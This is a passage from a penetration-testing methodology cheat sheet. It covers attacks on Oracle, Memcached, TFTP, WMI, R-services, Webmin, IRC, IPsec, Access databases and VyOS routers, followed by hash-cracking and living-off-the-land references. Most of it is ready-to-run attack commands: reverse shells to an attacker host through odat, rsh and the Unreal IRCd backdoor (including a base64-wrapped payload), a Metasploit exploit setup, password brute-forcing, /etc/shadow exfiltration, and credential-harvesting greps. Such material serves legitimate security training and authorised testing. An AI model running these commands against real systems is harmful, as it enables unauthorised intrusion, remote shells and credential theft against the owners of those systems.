system:manager                  # SYSTEM default
dbsnmp:dbsnmp                   # SNMP agent account
outln:outln
mdsys:mdsys
ordcommon:ordcommon
ctxsys:ctxsys
dba:dba
```

```bash
# Credential brute-force with odat
odat passwordguesser -s <IP> -p 1521 -d <SID>
odat passwordguesser -s <IP> -p 1521 -d <SID> --accounts-file accounts.txt

# Hydra
hydra -L users.txt -P passwords.txt -s 1521 <IP> oracle-listener

# Nmap brute
nmap -p 1521 --script oracle-brute --script-args oracle-brute.sid=<SID> -Pn <IP>
```

#### Connect & Enumerate

```bash
# Connect with known SID
sqlplus <USER>/<PASSWORD>@<IP>/<SID>

# Connect as SYSDBA (requires DBA privilege)
sqlplus <USER>/<PASSWORD>@<IP>/<SID> as sysdba

# If sqlplus not available — use odat
odat ctxsys -s <IP> -d <SID> -U <USER> -P <PASSWORD> --getFile /etc/passwd

# Useful SQL queries once connected:
# SELECT * FROM v$version;                              -- version
# SELECT * FROM dba_users;                              -- all users (DBA only)
# SELECT username, account_status FROM dba_users;       -- user status
# SELECT * FROM all_tables WHERE owner='<SCHEMA>';      -- tables
# SELECT * FROM user_role_privs;                        -- current user roles
# SELECT * FROM dba_role_privs WHERE grantee='<USER>'; -- user roles (DBA)
# SELECT PRIVILEGE FROM dba_sys_privs WHERE grantee='<USER>'; -- sys privs
# SELECT * FROM session_privs;                          -- session privileges
```

#### Exploitation

```bash
# odat — all-in-one Oracle testing (tests every module)
odat all -s <IP> -p 1521 -d <SID> -U <USER> -P <PASSWORD>

# File upload (utlfile module — requires CREATE ANY DIRECTORY or UTL_FILE access)
odat utlfile -s <IP> -d <SID> -U <USER> -P <PASSWORD> --putFile /tmp shell.sh ./shell.sh

# File download
odat utlfile -s <IP> -d <SID> -U <USER> -P <PASSWORD> --getFile /etc passwd /tmp/passwd.txt

# Execute OS commands (externaltable module — requires CREATE ANY TABLE)
odat externaltable -s <IP> -d <SID> -U <USER> -P <PASSWORD> --exec /tmp shell.sh

# Java stored procedure execution (requires CREATE PROCEDURE + Java class access)
odat java -s <IP> -d <SID> -U <USER> -P <PASSWORD> --exec /bin/bash "-c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"

# DBMS_SCHEDULER command execution
odat dbmsscheduler -s <IP> -d <SID> -U <USER> -P <PASSWORD> --exec "C:\Windows\System32\cmd.exe" "/c whoami"

# Password extraction
odat passwords -s <IP> -d <SID> -U <USER> -P <PASSWORD> --get-passwords

# Privilege escalation — grant DBA to current user (if possible)
# SQL: EXEC dbms_metadata.open('<USER>');
#      GRANT DBA TO <USER>;
```

#### Post-Exploit

> Full Oracle TNS attack chain (post-foothold exploitation): [attacking-common-applications.md § Phase 14t: Oracle Database (TNS Listener)](attacking-common-applications.md#phase-14t-oracle-database-tns-listener--tcp-1521).

### 3.24 Memcached (TCP 11211)
```bash
# Connect (usually unauthenticated)
telnet <IP> 11211
# Or:
nc -nv <IP> 11211

# Dump stats
echo "stats" | nc -nv <IP> 11211
echo "stats items" | nc -nv <IP> 11211

# Dump keys (per slab)
echo "stats cachedump <SLAB_ID> 100" | nc -nv <IP> 11211

# Get value by key
echo "get <KEY>" | nc -nv <IP> 11211

# Nmap scripts
nmap -p 11211 --script memcached-info -Pn <IP>

# Often leaks session tokens, credentials, or internal data
```

### 3.25 TFTP (UDP 69)
```bash
# No authentication — try to read/write files
# Connect
tftp <IP>
tftp> get /etc/passwd
tftp> put shell.php

# Nmap enumeration
nmap -sU -p 69 --script tftp-enum -Pn <IP>

# Common files to try:
# Cisco: running-config, startup-config
# General: /etc/passwd, /etc/shadow, boot.ini
```

### 3.26 WMI (TCP 135)
```bash
# WMI can be used for remote enumeration and command execution
# Requires valid credentials

# Check access via netexec
netexec wmi <IP> -u '<USER>' -p '<PASSWORD>'

# Remote command execution via WMI
impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<IP>

# WMI queries for enumeration (from Windows foothold)
# List running processes
wmic /node:<IP> /user:<USER> /password:<PASSWORD> process list brief

# List installed software
wmic /node:<IP> /user:<USER> /password:<PASSWORD> product get name,version

# List services
wmic /node:<IP> /user:<USER> /password:<PASSWORD> service get name,startmode,state
```

### 3.27 R-Services (TCP 512 / 513 / 514)

Legacy Unix remote command/login services. Rarely seen in production but **common on training labs and older Solaris/AIX boxes**. Authentication relies on `.rhosts` / `hosts.equiv` trust relationships — no encryption, no password if trusted.

| Port | Service | Binary | Purpose |
|------|---------|--------|---------|
| 512 | rexec | `rexecd` | Remote command execution (requires username + password) |
| 513 | rlogin | `rlogind` | Remote login (interactive shell, `.rhosts` trust) |
| 514 | rsh | `rshd` | Remote shell (single command, `.rhosts` trust) |

#### Enumeration

```bash
# Port check
nmap -p 512,513,514 -sV -Pn <IP>

# Check .rhosts trust (if local access on another trusted host)
cat /etc/hosts.equiv       # system-wide trust
cat ~/.rhosts              # per-user trust
# Format: <HOSTNAME> <USER>   or   + +   (trust everything — instant win)

# rlogin — interactive login (no password if trusted)
rlogin -l <USER> <IP>

# rsh — execute single command
rsh <IP> -l <USER> id
rsh <IP> -l <USER> cat /etc/passwd
rsh <IP> -l <USER> "cat /etc/shadow"

# rexec — requires password (unlike rlogin/rsh)
rexec <IP> -l <USER> -p <PASSWORD> id

# rwho — list logged-in users across trusted hosts (daemon on 513/UDP)
rwho
rusers -a <IP>
```

#### Exploitation

```bash
# If .rhosts contains `+ +` or `<YOUR_HOST> <YOUR_USER>`:
# Direct root login with no password
rlogin -l root <IP>

# Reverse shell via rsh
rsh <IP> -l root "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"

# File exfiltration
rsh <IP> -l root "cat /etc/shadow" > shadow.txt

# Upload tools
rsh <IP> -l root "cat > /tmp/linpeas.sh" < linpeas.sh

# If you have write access to a trusted host's .rhosts:
echo "+ +" >> ~/.rhosts     # Trust all hosts (lab only!)
# Then rlogin/rsh to the target without a password
```

#### Post-Exploit / Pivoting

```bash
# R-services trust is transitive — if Host A trusts Host B,
# and you own Host B, you can rlogin to Host A as the trusted user
# Check /etc/hosts.equiv on every compromised host for chained trust relationships

# Credential harvesting
cat /etc/hosts.equiv
find / -name ".rhosts" 2>/dev/null
# Usernames and trusted hosts from these files feed into further enumeration
```

> **OPSEC:** R-services transmit credentials and data in cleartext. On live engagements, prefer SSH. In labs, these are intentionally misconfigured for exploitation.

### 3.28 Webmin / MiniServ (TCP 10000)

Web-based system administration interface. Runs on port 10000 (HTTPS by default). Multiple known RCE vulnerabilities in older versions.

#### Enumeration

```bash
# Banner / version
nmap -p 10000 -sV --script http-title -Pn <IP>
# Look for: MiniServ X.XXX (Webmin httpd)

# Verify HTTPS access
curl -k https://<IP>:10000/ 2>&1 | head -20

# Version check (post-auth or from shell)
# From shell: cat /etc/webmin/version
# From login page: often shown in page footer or error messages

# Searchsploit
searchsploit webmin
searchsploit miniserv
```

#### Default / Common Credentials

```text
root:root
admin:admin
root:password
root:<hostname>
root:admin
```

#### Brute-Force

```bash
# Hydra HTTPS POST form login
hydra -l root -P /usr/share/wordlists/rockyou.txt -s 10000 <IP> \
  https-post-form "/session_login.cgi:user=^USER^&pass=^PASS^:F=Login failed"
```

> Full Webmin attack chain (post-foothold exploitation): [attacking-common-applications.md § Phase 14u: Webmin / MiniServ](attacking-common-applications.md#phase-14u-webmin--miniserv-tcp-10000).

### 3.29 IRC (TCP 6667 / 6697)
```bash
# Banner grab — version appears in 004 numeric on connect
nc -nv <TARGET> 6667
# Look for: 'Your host is X, running version Unreal3.2.8.1'

# Nmap service scan + auto-detect Unreal IRCd 3.2.8.1 backdoor (CVE-2010-2075)
nmap -p 6667,6697 -sV -Pn <TARGET>
nmap -p 6667 --script irc-unrealircd-backdoor,irc-info,irc-botnet-channels -Pn <TARGET>

# Brute-force IRC auth (operator / NickServ)
hydra -L users.txt -P passwords.txt irc://<TARGET>
```

#### CVE-2010-2075 — Unreal IRCd 3.2.8.1 Backdoor (RCE)
> **Context:** Backdoored source archive distributed 2009-11 → 2010-06. Any IRC command prefixed with `AB;` is passed to `system()` as the running user (typically low-priv `ircd`).
```bash
# Confirm vulnerable version first
nc -nv <TARGET> 6667
# 004 numeric must show 'Unreal3.2.8.1'

# === Manual exploitation (no metasploit) ===
# 1. Listener
nc -lvnp <ATTACKER_PORT>

# 2. Trigger backdoor — AB; prefix → system()
echo 'AB; bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1"' | nc <TARGET> 6667

# Base64 wrapper — avoids quoting / special-char mangling in payload path
PAYLOAD=$(echo -n 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1' | base64 -w0)
echo "AB; echo ${PAYLOAD} | base64 -d | bash" | nc <TARGET> 6667

# 3. Pre-shell sanity check — OOB ICMP callback proves RCE without committing to a shell
sudo tcpdump -i tun0 icmp &
echo 'AB; ping -c2 <ATTACKER_IP>' | nc <TARGET> 6667
```

```bash
# === Metasploit ===
msfconsole -q
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS <TARGET>
set RPORT 6667
set PAYLOAD cmd/unix/reverse_perl
set LHOST <ATTACKER_IP>
set LPORT <ATTACKER_PORT>
run
```

> **Tip:** Shell typically lands as low-priv service user (`ircd` / `irc` / `nobody`). Drop linpeas, hunt SUID / sudo / cron / readable creds in `/home/*/Unreal*/` for pivot to user shell, then standard linux privesc.

### 3.30 IKE/IPsec (UDP 500 / 4500)

IKE/IPsec on UDP/500 (and NAT-T on UDP/4500) is a high-value find: vendor IDs leak the appliance, Aggressive Mode leaks a server-side PSK hash that cracks offline, and Cisco-style group names brute easily.

```bash
# Tool install
apt install -y ike-scan

# Basic Main Mode handshake — confirms IKE service and leaks vendor IDs
ike-scan -M <TARGET>

# Output reveals: Encryption (DES/3DES/AES), Hash (MD5/SHA1/SHA256),
# DH Group (modp768/1024/1536/2048), Auth (PSK/RSA/XAUTH), LifeType,
# plus Vendor IDs (Windows-8, RFC 3947 NAT-T, Cisco Unity, Watchguard, etc.)

# NAT-T probe on UDP/4500
ike-scan -M --nat-t <TARGET>

# Try every transform combination — useful when default handshake fails
# --trans format: enc,hash,auth,group  (key-size after / for AES variants, e.g. 7/256)
ike-scan -M --trans=5,2,1,2 <TARGET>     # 3DES/SHA1/PSK/MODP1024
ike-scan -M --trans=7/256,2,1,5 <TARGET> # AES-256/SHA1/PSK/MODP1536

# Nmap script alternative
nmap -sU -p 500 --script ike-version <TARGET>
nmap -sU -p 500,4500 --script "ike-*" <TARGET>
```

#### Aggressive Mode — PSK hash extraction

> **Tip:** Aggressive Mode sends the PSK hash in the first response — capture it once, crack it offline. This is the win on Cisco/Watchguard/SonicWall appliances that still allow it.

```bash
# Probe for Aggressive Mode (no group ID — many appliances reply anyway)
ike-scan -M -A <TARGET>

# With a group/IKE-ID name (Cisco-style — usually required)
ike-scan -M -A --id=<GROUP_NAME> <TARGET>

# Save the captured hash to a file for offline cracking
ike-scan -M -A -P psk_hash.out --id=<GROUP_NAME> <TARGET>

# Crack with psk-crack (ships with ike-scan)
psk-crack -d /usr/share/wordlists/rockyou.txt psk_hash.out
psk-crack -b 8 psk_hash.out                          # 8-char brute force
psk-crack -b 6 --charset="0123456789" psk_hash.out   # numeric-only

# hashcat alternative
hashcat -m 5300 psk_hash.out /usr/share/wordlists/rockyou.txt   # IKE-PSK MD5
hashcat -m 5400 psk_hash.out /usr/share/wordlists/rockyou.txt   # IKE-PSK SHA1
```

#### Group / IKE-ID enumeration with ikeforce

```bash
# https://github.com/SpiderLabs/ikeforce
git clone https://github.com/SpiderLabs/ikeforce
cd ikeforce

# Enumerate valid VPN group names (look for distinct error responses)
python3 ikeforce.py <TARGET> -e -w /usr/share/seclists/Miscellaneous/ike-groupid.txt

# Once a group name is found — brute the PSK directly (online)
python3 ikeforce.py <TARGET> -s 1 -w /usr/share/wordlists/rockyou.txt -i <GROUP_NAME>
```

> **Tip:** A 32-character hex string surfaced via SNMP / web banners / FTP / config-file dumps on a host with UDP/500 open is almost always the IKE PSK in NTLM-hash form (Windows IPsec stores it that way). Try `hashcat -m 1000` before assuming it's MD5.

#### What to do with a cracked PSK

```bash
# Connect with strongSwan or Cisco vpnclient using the recovered PSK + group
# strongSwan ipsec.conf snippet:
#   conn target
#     keyexchange=ikev1
#     authby=secret
#     aggressive=yes
#     ike=aes256-sha1-modp1536
#     left=%defaultroute
#     right=<TARGET>
#     rightid=<GROUP_NAME>
# /etc/ipsec.secrets:
#   <GROUP_NAME> %any : PSK "<CRACKED_PSK>"

# After tunnel is up — pivot into the internal subnet exposed by the VPN
# See tunneling-pivoting.md for routing the internal subnet through the new tun
```

[Back to top](#enumeration--information-gathering-methodology)

---

## Phase 4: Post-Credential Enumeration

**Goal:** Once you have valid credentials, re-enumerate everything with authenticated access.

### 4.1 Immediate Re-Enumeration Checklist
```bash
# 1. Test creds against all services
netexec smb <SUBNET>/24 -u '<USER>' -p '<PASSWORD>'     # Check admin access (Pwn3d!)
netexec winrm <SUBNET>/24 -u '<USER>' -p '<PASSWORD>'   # Check WinRM access
netexec rdp <SUBNET>/24 -u '<USER>' -p '<PASSWORD>'     # Check RDP access
netexec mssql <SUBNET>/24 -u '<USER>' -p '<PASSWORD>'   # Check MSSQL access
netexec ssh <SUBNET>/24 -u '<USER>' -p '<PASSWORD>'     # Check SSH access

# 2. Authenticated SMB share enumeration
netexec smb <SUBNET>/24 -u '<USER>' -p '<PASSWORD>' --shares
smbmap -H <IP> -u '<USER>' -p '<PASSWORD>' -R    # Recursive listing

# 3. Authenticated LDAP dump
ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASSWORD>' <DC_IP>

# 4. BloodHound collection — full collector coverage (bloodhound-python / SharpHound / proxychains / --hashes variants)
#    see bloodhound-guide.md §0 Import Data

# 5. Password policy (before further spraying)
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' --pass-pol
```

### 4.2 Credential Re-Use Matrix
```text
For every set of credentials found:
┌──────────────────────────────────────────────────────┐
│  Test against all hosts for:                         │
│  ├── SMB (445) → Local admin? Shares?                │
│  ├── WinRM (5985) → Shell?                           │
│  ├── RDP (3389) → GUI access?                        │
│  ├── SSH (22) → Shell?                               │
│  ├── MSSQL (1433) → DB access? xp_cmdshell?          │
│  ├── Web apps → Login panels?                        │
│  └── FTP (21) → File access?                         │
│                                                      │
│  Also try:                                           │
│  ├── Slight password variations (P@ssw0rd → P@ssw0rd1) │
│  ├── Same password for other discovered users        │
│  └── Hash reuse (Pass-the-Hash)                      │
└──────────────────────────────────────────────────────┘
```

### 4.3 New Pivot Enumeration
After compromising a host, treat it as a new starting point:
```bash
# 1. Check network interfaces (dual-homed?)
ipconfig /all     # Windows
ip a              # Linux

# 2. Check ARP table for internal hosts
arp -a            # Windows
arp -n            # Linux

# 3. Check routing table
route print       # Windows
route -n          # Linux

# 4. Check listening services (internal-only services?)
netstat -ano      # Windows
ss -tulnp         # Linux

# 5. Scan newly discovered subnets through pivot
# See: [tunneling-pivoting.md](tunneling-pivoting.md) for SSH, Ligolo-ng, Chisel setup
```

### 4.4 MS Access Database Parsing (.mdb / .accdb)

Plaintext credentials commonly stored in Access DBs found on SMB shares — physical-security / HVAC / legacy vendor apps (ZKAccess, Lenel, Honeywell).

```bash
# Confirm filetype — .mdb = Access 97-2003 (Jet), .accdb = Access 2007+
file <FILE>.mdb

# Install (most pentest distros already have it)
sudo apt install mdbtools -y
```

#### Schema discovery
```bash
# https://github.com/mdbtools/mdbtools
# List all tables — grep for credential-bearing names
mdb-tables <FILE>.mdb
mdb-tables <FILE>.mdb | tr ' ' '\n' | grep -iE 'user|auth|account|cred|login|password|admin|operator'

# Dump full schema (column names per table)
mdb-schema <FILE>.mdb
mdb-schema <FILE>.mdb -T <TABLE>
```

#### Data extraction
```bash
# Dump a single table to CSV
mdb-export <FILE>.mdb <TABLE>
mdb-export <FILE>.mdb auth_user
mdb-export <FILE>.mdb users

# Dump every table → grep for plaintext creds
for t in $(mdb-tables -1 <FILE>.mdb); do
  echo "=== $t ==="
  mdb-export <FILE>.mdb "$t"
done | tee mdb_dump.txt
grep -iE 'password|passwd|pwd|secret|admin|hash' mdb_dump.txt
```

#### Interactive SQL
```bash
# Drop into a SQL prompt against the .mdb
mdb-sql <FILE>.mdb
# mdb> select * from auth_user;
# mdb> go
```

#### Convert to SQLite for richer queries
```bash
# Schema → SQLite
mdb-schema <FILE>.mdb sqlite | sqlite3 out.db

# Data → SQLite (per table)
for t in $(mdb-tables -1 <FILE>.mdb); do
  mdb-export -I sqlite <FILE>.mdb "$t" | sqlite3 out.db
done

sqlite3 out.db ".tables"
sqlite3 out.db "SELECT * FROM auth_user;"
```

> **Tip:** `mdbtools` only handles `.mdb` (Jet). For `.accdb` (Access 2007+) use `accdb-tools`, open in LibreOffice Base, or mount on a Windows VM with the Access ODBC driver.

> **Common loot tables:** `auth_user`, `users`, `tblUsers`, `Logins`, `Accounts`, `Operators`, `tbl_Operator` — physical-security / HVAC / building-management vendor apps frequently store ops creds in plaintext.

### 4.5 VyOS / Vyatta / EdgeOS Router Config Credential Harvest

VyOS-based routers (VyOS, Vyatta, Ubiquiti EdgeOS) store their entire configuration in `/config/config.boot` — a plaintext hierarchical file containing interface IPs, static routes, firewall rules, VPN PSKs, RADIUS secrets, and user credentials (hashed or plaintext). Found after gaining shell access to the router via SSH, exploiting a web UI vuln, or mounting a backup archive from an SMB/FTP share.

```bash
# Locate the config file (default paths)
cat /config/config.boot
# Fallback locations on older Vyatta / EdgeOS images
cat /opt/vyatta/etc/config/config.boot
cat /config/config.boot.default

# If you found a backup archive (.tar.gz / .img) on a share, extract first
tar -xzf <BACKUP>.tar.gz -C /tmp/vyos_backup/
find /tmp/vyos_backup/ -name 'config.boot' -exec cat {} \;
```

#### Credential extraction from config.boot

```bash
# User accounts — plaintext or hashed passwords
grep -A5 'login {' /config/config.boot
grep -E 'encrypted-password|plaintext-password' /config/config.boot
# Format: user <USERNAME> { authentication { encrypted-password "<HASH>" } }
# Hash is typically $6$ (SHA-512crypt) or $1$ (MD5crypt) — crack with hashcat -m 1800 / -m 500

# VPN Pre-Shared Keys (IPsec / L2TP / OpenVPN)
grep -iE 'pre-shared-secret|shared-secret|secret' /config/config.boot
grep -B2 -A5 'ipsec' /config/config.boot
grep -B2 -A5 'l2tp' /config/config.boot

# OpenVPN secrets / TLS keys referenced in config
grep -iE 'tls|openvpn|secret-file|cert-file|key-file' /config/config.boot

# RADIUS / TACACS+ shared secrets
grep -iE 'radius|tacacs' /config/config.boot
grep -A3 'radius-server' /config/config.boot

# SNMP community strings
grep -A5 'snmp {' /config/config.boot
grep 'community' /config/config.boot

# BGP / OSPF / RIP authentication keys
grep -iE 'md5|authentication|password' /config/config.boot | grep -v encrypted-password

# Wi-Fi / wireless PSKs (EdgeOS with AirMax)
grep -iE 'passphrase|wpa-passphrase|wireless' /config/config.boot

# Static routes — map internal subnets reachable through this router
grep -A2 'static {' /config/config.boot
grep 'next-hop' /config/config.boot

# Interface IPs — identify directly-attached networks for pivoting
grep -E 'address [0-9]' /config/config.boot

# DNS forwarders — may reveal internal DNS servers
grep -A3 'dns {' /config/config.boot
grep 'name-server' /config/config.boot

# Full credential dump one-liner
grep -iE 'password|secret|community|key |psk' /config/config.boot
```

```bash
# Crack extracted password hashes
# VyOS uses SHA-512crypt by default ($6$...)
hashcat -m 1800 vyos_hashes.txt /usr/share/wordlists/rockyou.txt
# Older Vyatta may use MD5crypt ($1$...)
hashcat -m 500 vyos_hashes.txt /usr/share/wordlists/rockyou.txt
```

#### Living-off-the-land / LOTL variant

```bash
# If on the VyOS box itself with limited shell (vbash / operational mode only)
# VyOS operational-mode commands (no configure mode needed)
show configuration
show configuration commands | match password
show configuration commands | match secret
show configuration commands | match community

# If vbash restricts commands but you can read files
cat /config/config.boot | grep -iE 'password|secret|community|key |psk'

# Pure POSIX sh (busybox / ash on EdgeOS) — no bash needed
while IFS= read -r line; do
  case "$line" in *password*|*secret*|*community*|*psk*) echo "$line" ;; esac
done < /config/config.boot

# From a remote pivot host with SSH access to the router
ssh <USER>@<ROUTER_IP> 'cat /config/config.boot' | grep -iE 'password|secret|community|psk'

# Windows LOTL — if config.boot was pulled to a Windows box
findstr /i "password secret community psk key" config.boot
```

> **Tip:** VyOS config.boot often contains VPN PSKs that grant access to internal networks not visible from the DMZ. Cross-reference `next-hop` routes and interface addresses to identify new subnets for pivoting. RADIUS secrets unlock authentication to other network devices sharing the same RADIUS server.

[Back to top](#enumeration--information-gathering-methodology)

---

## Quick Reference: Enumeration by Port

| Port | Service | First Commands |
|---:|---|---|
| 21 | FTP | `ftp <IP>`, `nmap -p 21 --script ftp-anon` |
| 22 | SSH | `nc -nv <IP> 22`, `hydra ssh` |
| 25 | SMTP | `nc -nv <IP> 25`, `smtp-user-enum` |
| 53 | DNS | `dig axfr @<IP> <DOMAIN>`, `dnsrecon` |
| 69 | TFTP | `tftp <IP>`, `nmap -sU -p 69 --script tftp-enum` |
| 79 | Finger | `finger @<IP>` |
| 80/443 | HTTP/S | `whatweb`, `gobuster dir`, `ffuf vhost` |
| 88 | Kerberos | `kerbrute userenum`, `impacket-GetNPUsers` |
| 110/143 | POP3/IMAP | `nc <IP> 110`, `curl imaps` |
| 111 | RPC | `rpcinfo -p <IP>` |
| 135 | MSRPC | `rpcclient -U "" -N <IP>` |
| 139/445 | SMB | `netexec smb --shares`, `smbclient -L`, `enum4linux-ng` |
| 161 | SNMP | `onesixtyone`, `snmpwalk` |
| 389/636 | LDAP | `ldapsearch -x`, `ldapdomaindump` |
| 873 | rsync | `rsync --list-only` |
| 1433 | MSSQL | `netexec mssql`, `impacket-mssqlclient` |
| 1521 | Oracle | `odat` |
| 2049 | NFS | `showmount -e` |
| 3306 | MySQL | `mysql -h <IP> -u root` |
| 3389 | RDP | `xfreerdp`, `nmap --script rdp-ntlm-info` |
| 5432 | PostgreSQL | `psql -h <IP> -U postgres` |
| 5900 | VNC | `vncviewer`, `nmap --script vnc-brute` |
| 5985 | WinRM | `evil-winrm`, `netexec winrm` |
| 6379 | Redis | `redis-cli -h <IP>` |
| 8080 | HTTP Alt | `whatweb`, `gobuster dir` |
| 11211 | Memcached | `echo "stats" \| nc <IP> 11211` |

---

## Quick Reference: Username Enumeration Methods

| Method | Tool | Prerequisite |
|---|---|---|
| RID Brute-force | `netexec smb --rid-brute` | Null/guest SMB session |
| Kerberos enum | `kerbrute userenum` | None (no lockouts) |
| LDAP anonymous | `ldapsearch` | Anonymous bind allowed |
| RPC null session | `rpcclient enumdomusers` | Null RPC session |
| SMTP VRFY/EXPN | `smtp-user-enum` | SMTP with VRFY enabled |
| Finger | `finger @<IP>` | Finger service running |
| Web scraping | Custom / CeWL | Public web pages |
| OSINT | `theHarvester`, LinkedIn | Public information |
| SNMP | `snmpwalk` | Community string known |

---

## Quick Reference: Password Attack Methods

| Attack | When to Use | Tool |
|---|---|---|
| **Password Spraying** | Wide user list, 1-2 passwords | `netexec`, `kerbrute passwordspray` |
| **Brute-Force** | Single account, no lockout | `hydra`, `netexec`, Burp Intruder |
| **AS-REP Roast** | Accounts without pre-auth | `impacket-GetNPUsers` |
| **Kerberoast** | Service accounts with SPNs | `impacket-GetUserSPNs` |
| **Hash Cracking** | Captured hashes | `hashcat`, `john` |
| **Pass-the-Hash** | Have NT hash | `netexec`, `evil-winrm -H`, `impacket` |
| **Pass-the-Ticket** | Have Kerberos ticket | `export KRB5CCNAME`, `impacket -k` |
| **Credential Stuffing** | Breach passwords | Manual / custom scripts |

---

## Quick Reference: Hash Identification

Identify the hash type before cracking — wrong mode wastes time and fails silently.

```bash
# Dedicated hash identification tools
hashid '<HASH>'                   # identifies multiple possible hash types
hash-identifier '<HASH>'          # alternative identifier (separate package)

# Hashcat's own example hash database — search by keyword
hashcat --example-hashes | grep -i 'ntlm'
hashcat --example-hashes | grep -i 'sha512'
hashcat --example-hashes | grep -i 'kerberos'

# hashcat mode reference: https://hashcat.net/wiki/doku.php?id=hashcat
```

### Hash Format Quick Reference

| Pattern | Hash Type | Hashcat Mode |
|---|---|---|
| `$1$...` | MD5crypt (old Linux `/etc/shadow`) | `-m 500` |
| `$5$...` | SHA-256crypt (Linux `/etc/shadow`) | `-m 7400` |
| `$6$...` | SHA-512crypt (Linux `/etc/shadow`) | `-m 1800` |
| `$y$...` | yescrypt (modern Linux) | Varies by Hashcat version (`hashcat --help | grep -i yescrypt`) |
| `$P$...` | phpass (WordPress / phpBB) | `-m 400` |
| `$apr1$...` | Apache MD5 | `-m 1600` |
| 32 hex chars | MD5 or NTLM | `-m 0` (MD5) / `-m 1000` (NTLM) |
| 40 hex chars | SHA-1 | `-m 100` |
| 64 hex chars | SHA-256 | `-m 1400` |
| `$krb5asrep$23$...` | AS-REP Roast (RC4) | `-m 18200` |
| `$krb5tgs$23$...` | Kerberoast (RC4) | `-m 13100` |
| `$krb5tgs$18$...` | Kerberoast (AES-256) | `-m 19700` |
| `$NETNTLMv2$...` / starts with `user::domain:` | NTLMv2 (Responder) | `-m 5600` |
| `aad3b435b51404eeaad3b435b51404ee` | Empty LM hash (ignore this field in dumps) | N/A |
| MSCache2 in `CACHE` field | Domain cached credentials (DCC2) | `-m 2100` |

## Common Hashcat Commands
```bash
# Wordlist attack (most common)
hashcat -m <MODE> hashes.txt /usr/share/wordlists/rockyou.txt

# Wordlist + rules (highly recommended — catches mutations)
hashcat -m <MODE> hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m <MODE> hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# Mask attack (pattern-based brute-force — e.g. 8 chars: upper+lower+digit)
hashcat -m <MODE> -a 3 hashes.txt ?u?l?l?l?l?l?d?d
# Masks: ?u = uppercase, ?l = lowercase, ?d = digit, ?s = special char, ?a = all

# Combinator (combine two wordlists)
hashcat -m <MODE> -a 1 hashes.txt wordlist1.txt wordlist2.txt

# Show cracked hashes (reads from $HASHCAT_POTFILE — default ~/.hashcat/hashcat.potfile;
# use --potfile-disable to skip the potfile or --potfile-path to override)
hashcat -m <MODE> hashes.txt --show

# Ignore username field in dump output (format: user:hash)
hashcat -m <MODE> hashes.txt /usr/share/wordlists/rockyou.txt --username

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hashes.txt
john --show hashes.txt    # show cracked hashes

# Auto-detect hash type (John)
john hashes.txt           # John auto-detects if no --format specified
john --list=formats       # list all supported formats
```

## LOTL Quick Reference

Every native / built-in technique used in this methodology, indexed by use case. All entries are tool-free or rely solely on binaries shipped with the OS.

### Linux (bash builtins, coreutils, curl)

| Use case | One-liner | Notes |
|---|---|---|
| TCP port check | `timeout 1 bash -c '</dev/tcp/<IP>/<PORT>' && echo open` | bash builtin; **not on Alpine ash** |
| TCP sweep (parallel) | `seq 1 254 \| xargs -P 50 -I{} bash -c '(timeout 1 bash -c "</dev/tcp/<NET>.{}/445" 2>/dev/null) && echo {}'` | No nmap |
| UDP knock | `(echo > /dev/udp/<IP>/<PORT>) 2>/dev/null && echo reachable` | bash >= 4 |
| Banner grab HTTP | `exec 3<>/dev/tcp/<IP>/80; printf 'GET / HTTP/1.0\r\n\r\n' >&3; cat <&3` | |
| Reverse shell | `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1` | |
| Dir brute (parallel) | `xargs -a wordlist.txt -P 50 -I{} curl -sk -o /dev/null -w "%{http_code} {}\n" http://<IP>/{} \| grep -Ev '^(404\|400) '` | No ffuf |
| Vhost brute | `while read s; do curl -sk -o /dev/null -w "%{size_download} $s\n" -H "Host: $s.<DOMAIN>" http://<IP>/; done < subs.txt` | Filter by baseline size |
| Login brute (POST) | `while read p; do curl -sk -d "u=admin&p=$p" http://<IP>/login \| grep -q Invalid \|\| echo "HIT $p"; done < pw.txt` | |
| SMTP user enum | `printf 'EHLO x\r\nVRFY <USER>\r\nQUIT\r\n' \| nc -w3 <IP> 25` | |

### Windows (cmd.exe / PowerShell — no RSAT, no external binaries)

| Use case | Command | Notes |
|---|---|---|
| TCP port check | `Test-NetConnection -ComputerName <IP> -Port <PORT>` | PS 5.1+ |
| TCP sweep (parallel) | `1..1024 \| ForEach-Object -Parallel { ... }` | **PS 7+ only** |
| TCP sweep (compat) | `80,443,445,3389 \| % { Test-NetConnection <IP> -Port $_ -WarningAction 0 \| ? TcpTestSucceeded }` | PS 5.1 |
| Domain users | `([adsisearcher]"(objectCategory=user)").FindAll() \| % { $_.Properties.samaccountname }` | No RSAT |
| Domain computers | `([adsisearcher]"(objectCategory=computer)").FindAll() \| % { $_.Properties.dnshostname }` | No RSAT |
| Kerberoastable | `([adsisearcher]"(&(samAccountType=805306368)(servicePrincipalName=*))").FindAll()` | No RSAT |
| AS-REP roastable | `([adsisearcher]"(userAccountControl:1.2.840.113556.1.4.803:=4194304)").FindAll()` | No RSAT |
| Unconstrained deleg | `([adsisearcher]"(userAccountControl:1.2.840.113556.1.4.803:=524288)").FindAll()` | UAC bit 0x80000 |
| List DCs | `nltest /dclist:<DOMAIN>` | Built-in |
| Trusts | `nltest /domain_trusts /all_trusts /v` | Built-in |
| SPN dump | `setspn -T <DOMAIN> -Q */*` | Default on DCs; RSAT on workstation |
| Domain group | `net group "Domain Admins" /domain` | Always available |
| Password policy | `net accounts /domain` | Always available |
| WinRM exec (cmd) | `winrs -r:<TARGET> -u:<USER> -p:<PASSWORD> cmd` | Built-in |
| WinRM exec (PS) | `Invoke-Command -ComputerName <TARGET> -Credential $c -ScriptBlock {...}` | Built-in |
